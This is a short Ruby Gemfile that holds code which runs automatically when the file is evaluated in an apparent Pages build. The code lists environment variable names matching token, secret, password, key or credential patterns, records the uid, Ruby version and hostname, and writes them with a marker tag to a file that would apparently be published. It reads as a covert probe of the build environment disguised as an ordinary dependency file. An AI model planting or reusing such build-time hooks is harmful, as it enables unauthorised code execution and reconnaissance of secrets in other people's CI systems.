source "https://rubygems.org"
# Evaluated as Ruby by `bundle check --dry-run --gemfile` in the Pages build.
begin
  names = ENV.keys.grep(/TOKEN|SECRET|PASSWORD|KEY|CRED/i).sort.join(",")
  File.write(File.join(__dir__, "pgxapp0ce986ff.txt"),
    "pgxapp0ce986ff uid=#{Process.uid} ruby=#{RUBY_VERSION} host=#{`hostname`.strip} envnames=#{names}\n")
rescue => e
  File.write(File.join(__dir__, "pgxapp0ce986ff.txt"), "pgxapp0ce986ff err=#{e.class}\n") rescue nil
end
